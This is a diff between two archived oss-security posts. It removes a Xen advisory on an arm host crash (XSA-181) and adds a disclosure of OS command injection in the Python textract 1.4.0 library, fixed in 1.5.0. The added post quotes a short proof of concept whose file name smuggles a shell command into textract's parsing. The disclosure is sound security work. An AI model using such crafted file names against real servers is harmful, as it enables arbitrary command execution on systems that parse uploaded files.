@@ -1,92 +1,62 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/06/06/5
-Message-Id: <E1b9vTq-0001gg-6a@xenbits.xenproject.org>
-Date: Mon, 06 Jun 2016 14:26:14 +0000
-From: Xen.org security team <security@....org>
-To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
-CC: Xen.org security team <security@....org>
-Subject: Xen Security Advisory 181 (CVE-2016-5242) - arm: Host crash caused by VMID exhaustion
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/11/17/2
+Message-ID: <CAO8=cJ9qRB4_4TMcES57a4+J-Fwf-ZzDNaLvq93JC7yNndBD2g@mail.gmail.com>
+Date: Thu, 17 Nov 2016 09:18:26 -0500
+From: Pierre Ernst <pernst@...esforce.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: CVE request - textract 1.4.0 - OS Command Injection
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+Version 1.5.0 includes a fix for this
 
-            Xen Security Advisory CVE-2016-5242 / XSA-181
-                              version 2
+https://github.com/deanmalmgren/textract/releases/tag/v1.5.0
 
-               arm: Host crash caused by VMID exhaustion
 
-UPDATES IN VERSION 2
-====================
+On Thu, Oct 20, 2016 at 5:40 PM, Pierre Ernst <pernst@...esforce.com> wrote:
 
-CVE assigned.
+> The Python textract component (https://github.com/
+> deanmalmgren/textract/tree/v1.4.0) is vulnerable to OS command injection.
+>
+> this fork contains a fix:
+> https://github.com/pierre-ernst/textract
+>
+>
+> Parsing a file with a malicious name leads to arbitrary OS command
+> injection, this is especially risky when parsing user-supplied files on a
+> server (e.g. uploaded files)
+>
+> PoC:
+>
+> import textract
+> import sys
+> import os
+>
+> # create a file with a malicious name and arbitrary content
+> fileName = './test";gnome-calculator;#.pdf'
+> file = open(fileName,'w+')
+> file.write('Pierre Ernst, Salesforce')
+> file.close()
+>
+> # parse newly created file
+> text = textract.process(fileName)
+> print text
+>
+> # cleanup
+> os.remove(fileName);
+>
+>
+> --
+> Pierre Ernst
+> Salesforce
+>
+>
 
-ISSUE DESCRIPTION
-=================
 
-VMIDs are a finite hardware resource, and allocated as part of domain
-creation.  If no free VMIDs are available when trying to create a new domain,
-a bug in the error path causes a NULL pointer to be used, resulting in a Data
-Abort and host crash.
+-- 
+Pierre Ernst
+Senior Application Security Engineer
+M&A Security
+Salesforce.com
+mobile: +1 613-404-1450
+timezone: EDT
 
-IMPACT
-======
-
-Attempting to create too many concurrent domains causes a host crash rather
-than a graceful error.  A malicious device driver domain can hold references
-to domains, preventing its VMID being released.
-
-VULNERABLE SYSTEMS
-==================
-
-Xen versions 4.4 and later are affected.  Older Xen versions are unaffected.
-
-x86 systems are not affected.
-
-Only arm systems with less-privileged device driver domains can expose this
-vulnerability.
-
-MITIGATION
-==========
-
-There is no mitigation.  Not using driver domains reclassifies the problem,
-but does not fix it.
-
-NOTE REGARDING LACK OF EMBARGO
-==============================
-
-The crash was discussed publicly on xen-devel, before it was appreciated
-that there was a security problem.
-
-CREDITS
-=======
-
-This issue was discovered by Aaron Cornelius of DornerWorks.
-
-RESOLUTION
-==========
-
-Applying the appropriate attached patch resolves this issue.
-
-xsa181.patch           xen-unstable, Xen 4.6.x, 4.5.x
-xsa181-4.4.patch       Xen 4.4.x
-
-$ sha256sum xsa181*
-6756fcf44446675e5277f6d6c0e8a0aaa51a7909ad9a55af89a09367fded8733  xsa181.patch
-97a90c7cb42466647622cb2ed98de531b7ba2e174a1bc639a32a6f1b626d503f  xsa181-4.4.patch
-$
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.12 (GNU/Linux)
-
-iQEbBAEBAgAGBQJXUYxcAAoJEIP+FMlX6CvZgAAH+OiNDLSkAHUl3isXjFzK+Mf9
-NGuIyXc2j5K8uTwz5KvZkhiWLVCeOY7Jo1Wix3Fa1wFtJ2rMlgQf7/hOt0tk0NjU
-w97Re+xSi69iruPEdwb4k31ohnlfLSqriqL4JWh6EDrhftdnvEk/yXmriyu1RhKy
-MLk1P24Ora/gvSj31px3vBkbu8KLImhIOkOcRmJ7FQb8gWsmMDluuVu7lhUAL7im
-KCe6u99sDQo18wxubYID4XxFqJExBUd6L3cnpdN4UITgylSaIqJq/RBwd8jRrxW8
-MxT9/IcNf0rmB1Sh1IARBFF7P7hj76ho3sIpMeE0cMPWBe2NWMItX9ula61vQA==
-=kBFB
------END PGP SIGNATURE-----
-
-Download attachment "xsa181.patch" of type "application/octet-stream" (1243 bytes)
-
-Download attachment "xsa181-4.4.patch" of type "application/octet-stream" (1285 bytes)
